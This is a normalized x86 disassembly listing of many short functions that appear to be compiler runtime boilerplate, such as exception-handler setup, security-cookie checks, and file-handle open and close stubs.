sub_40bdba
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40bf54
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40c0a8
call sub_40a142
retn
sub_40c0ae
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40c072
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_40c25b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_40c2d5
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_40c87e
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_40cb6e
call sub_40f9b0
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_409fcc
pop ecx
retn
call sub_40f78a
sub_40d9f6
push 0xe
call sub_40b9f6
pop ecx
retn
sub_40daca
push sub_40da88
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_40e1df
and [ rw-data ] 0x0
retn
sub_40e514
push 0xc
call sub_40b9f6
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_40e7de
push 0xd
call sub_40b9f6
pop ecx
retn
sub_40ebad
push 0xd
call sub_40b9f6
pop ecx
retn
sub_40ebe6
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_40ea4c
pop ecx
mov [ rw-data ] 0x1
sub_40f20d
push 0x2
call sub_40a3c3
sub_40f2f6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_40f220
add esp 0xc
pop ebp
retn 0x4
sub_40f329
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_410895
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_40f35b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_40f220
add esp 0xc
pop ebp
retn 0x8
sub_40f81d
push 0x1
call sub_40b9f6
pop ecx
retn
sub_40f978
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_40cc3d
pop ecx
pop ecx
retn
sub_40f9a7
push 0x1
call sub_40b9f6
pop ecx
retn
sub_40f9b0
push 0x1
call sub_40f8d6
pop ecx
retn
sub_40fcee
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40fb99
add esp 0x14
pop ebp
retn
sub_40fd43
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_40fd0b
pop ecx
pop ecx
pop ebp
retn
sub_40fda9
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_40fd56
add esp 0x10
pop ebp
retn
sub_410690
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_411400
sub_4106a6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_411400
sub_410869
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_4107a0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_4108b4
call eax
retn
sub_410990
push esi
call sub_40cc01
pop ecx
retn
sub_411161
push ebx
call sub_4118bc
pop ecx
retn
sub_41123a
push ebx
call sub_4118bc
pop ecx
retn
sub_4113a7
push [ ebp + 0x8 ]
call sub_4118bc
pop ecx
retn
sub_411583
push ebx
call sub_4118bc
pop ecx
retn
sub_411714
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4115fe
add esp 0x10
pop ebp
retn
sub_4118b3
push 0xa
call sub_40b9f6
pop ecx
retn
sub_411951
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_411970
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_411d72
mov [ ecx ] r--data
jmp sub_40a545
sub_411ed0
push [ ebp - 0x14 ]
call sub_411e03
pop ecx
retn
sub_411f14
call sub_40b2d2
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_40b2d2
dec [ eax + 0x90 ]
sub_411fb6
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_411fbf
mov esp [ ebp - 0x18 ]
call sub_40bb02
sub_41206c
push 0x4
mov eax sub_412cb4
call sub_412a9c
call sub_40b2d2
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_40bb3b
call sub_40bb4e
sub_412145
mov eax [ ebp - 0x14 ]
call sub_411f2e
retn
sub_4123bc
xor eax eax
inc eax
retn
sub_4123c0
mov esp [ ebp - 0x18 ]
call sub_40bb02
sub_412455
xor eax eax
inc eax
retn
sub_412459
mov esp [ ebp - 0x18 ]
call sub_40bb02
sub_41294c
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40a577
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_412ad2
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_412af0
mov eax [ ebp + 0x8 ]
jmp sub_4091d0
sub_412af8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_409fbd
mov eax r--data
jmp sub_411a1b
sub_412b20
mov eax [ ebp + 0x8 ]
push eax
call sub_406d50
retn
sub_412b2a
mov esi [ ebp + 0x8 ]
add esi 0x10
jmp sub_408fb0
sub_412b35
mov eax [ ebp + 0x8 ]
add eax 0x20
push eax
call sub_406d50
retn
sub_412b42
mov eax [ ebp + 0x8 ]
add eax 0x30
push eax
call sub_406d50
retn
sub_412b4f
mov eax [ ebp + 0x8 ]
add eax 0x40
push eax
call sub_406d50
retn
sub_412b5c
mov eax [ ebp + 0x8 ]
add eax 0x50
push eax
call sub_406d50
retn
sub_412b69
mov eax [ ebp + 0x8 ]
add eax 0x74
jmp sub_406db0
sub_412b74
mov eax [ ebp + 0x8 ]
add eax 0x8c
jmp sub_406db0
sub_412b81
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_409fbd
mov eax r--data
jmp sub_411a1b
sub_412ba0
mov eax [ ebp - 0x14 ]
push eax
call sub_40a0eb
pop ecx
retn
sub_412bab
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_409fbd
mov eax r--data
jmp sub_411a1b
sub_412bd0
lea esi [ ebp - 0x230 ]
jmp sub_408fb0
sub_412bdb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x234 ]
xor ecx eax
call sub_409fbd
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_409fbd
mov eax r--data
jmp sub_411a1b
sub_412c10
mov eax [ ebp + 0x8 ]
push eax
call sub_406d50
retn
sub_412c1a
mov esi [ ebp + 0x8 ]
add esi 0x10
jmp sub_408fb0
sub_412c25
mov eax [ ebp + 0x8 ]
add eax 0x20
push eax
call sub_406d50
retn
sub_412c32
mov eax [ ebp + 0x8 ]
add eax 0x30
push eax
call sub_406d50
retn
sub_412c3f
mov eax [ ebp + 0x8 ]
add eax 0x40
push eax
call sub_406d50
retn
sub_412c4c
mov eax [ ebp + 0x8 ]
add eax 0x50
push eax
call sub_406d50
retn
sub_412c59
mov eax [ ebp + 0x8 ]
add eax 0x74
jmp sub_406db0
sub_412c64
mov eax [ ebp + 0x8 ]
add eax 0x8c
jmp sub_406db0
sub_412c71
mov eax [ ebp - 0x10 ]
jmp sub_4091d0
sub_412c79
mov eax [ ebp - 0x14 ]
jmp sub_4091d0
sub_412c81
mov eax [ ebp - 0x14 ]
jmp sub_4091d0
sub_412c89
mov eax [ ebp - 0x14 ]
jmp sub_4091d0
sub_412c91
mov eax [ ebp + 0x8 ]
jmp sub_4091d0
sub_412c99
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_409fbd
mov eax r--data
jmp sub_411a1b
sub_412cb4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_409fbd
mov eax r--data
jmp sub_411a1b
sub_412ccf
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_40a545
